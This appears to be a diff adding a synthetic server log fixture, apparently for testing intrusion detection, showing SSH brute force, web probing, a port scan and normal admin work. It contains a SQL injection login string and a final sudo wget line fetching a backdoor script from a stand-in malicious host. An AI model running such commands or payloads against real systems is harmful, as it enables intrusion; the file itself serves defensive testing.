@@ -1,0 +1,28 @@
+Jan 15 01:12:03 prodserver sshd[1001]: Failed password for root from 185.220.101.45 port 44001 ssh2
+Jan 15 01:12:06 prodserver sshd[1002]: Failed password for root from 185.220.101.45 port 44002 ssh2
+Jan 15 01:12:09 prodserver sshd[1003]: Failed password for admin from 185.220.101.45 port 44003 ssh2
+Jan 15 01:12:12 prodserver sshd[1004]: Invalid user ubuntu from 185.220.101.45 port 44004
+Jan 15 01:12:15 prodserver sshd[1005]: Failed password for invalid user ubuntu from 185.220.101.45 port 44005 ssh2
+Jan 15 01:12:18 prodserver sshd[1006]: Failed password for root from 185.220.101.45 port 44006 ssh2
+Jan 15 01:12:21 prodserver sshd[1007]: Accepted password for root from 185.220.101.45 port 44007 ssh2
+185.220.101.45 - - [15/Jan/2024:08:45:01 +0000] "GET /admin HTTP/1.1" 403 512
+185.220.101.45 - - [15/Jan/2024:08:45:02 +0000] "GET /.env HTTP/1.1" 404 0
+185.220.101.45 - - [15/Jan/2024:08:45:03 +0000] "GET /wp-admin/admin.php HTTP/1.1" 404 0
+185.220.101.45 - - [15/Jan/2024:08:45:05 +0000] "GET /login?user=admin&pass=' OR 1=1-- HTTP/1.1" 500 200
+Jan 15 08:55:00 prodserver kernel: [UFW BLOCK] IN=eth0 OUT= MAC=... SRC=91.92.251.103 DST=10.0.0.1 PROTO=TCP SPT=11001 DPT=22
+Jan 15 08:55:01 prodserver kernel: [UFW BLOCK] IN=eth0 OUT= MAC=... SRC=91.92.251.103 DST=10.0.0.1 PROTO=TCP SPT=11002 DPT=80
+Jan 15 08:55:02 prodserver kernel: [UFW BLOCK] IN=eth0 OUT= MAC=... SRC=91.92.251.103 DST=10.0.0.1 PROTO=TCP SPT=11003 DPT=443
+Jan 15 08:55:03 prodserver kernel: [UFW BLOCK] IN=eth0 OUT= MAC=... SRC=91.92.251.103 DST=10.0.0.1 PROTO=TCP SPT=11004 DPT=3306
+Jan 15 08:55:04 prodserver kernel: [UFW BLOCK] IN=eth0 OUT= MAC=... SRC=91.92.251.103 DST=10.0.0.1 PROTO=TCP SPT=11005 DPT=5432
+Jan 15 08:55:05 prodserver kernel: [UFW BLOCK] IN=eth0 OUT= MAC=... SRC=91.92.251.103 DST=10.0.0.1 PROTO=TCP SPT=11006 DPT=8080
+Jan 15 08:55:06 prodserver kernel: [UFW BLOCK] IN=eth0 OUT= MAC=... SRC=91.92.251.103 DST=10.0.0.1 PROTO=TCP SPT=11007 DPT=8443
+Jan 15 08:55:07 prodserver kernel: [UFW BLOCK] IN=eth0 OUT= MAC=... SRC=91.92.251.103 DST=10.0.0.1 PROTO=TCP SPT=11008 DPT=9200
+Jan 15 08:55:08 prodserver kernel: [UFW BLOCK] IN=eth0 OUT= MAC=... SRC=91.92.251.103 DST=10.0.0.1 PROTO=TCP SPT=11009 DPT=6379
+Jan 15 08:55:09 prodserver kernel: [UFW BLOCK] IN=eth0 OUT= MAC=... SRC=91.92.251.103 DST=10.0.0.1 PROTO=TCP SPT=11010 DPT=27017
+Jan 15 09:30:00 prodserver sshd[2001]: Accepted publickey for devops from 10.0.0.15 port 56000 ssh2
+Jan 15 09:30:01 prodserver sshd[2001]: pam_unix(sshd:session): session opened for user devops by (uid=1001)
+Jan 15 09:35:00 prodserver sudo: devops : TTY=pts/0 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Jan 15 03:00:15 prodserver sshd[3001]: Accepted password for admin from 198.51.100.22 port 61100 ssh2
+Jan 15 03:00:16 prodserver sshd[3001]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Jan 15 03:01:00 prodserver sudo: admin : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/crontab -e
+Jan 15 03:02:00 prodserver sudo: admin : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://malicious.example.com/backdoor.sh -O /tmp/bd.sh
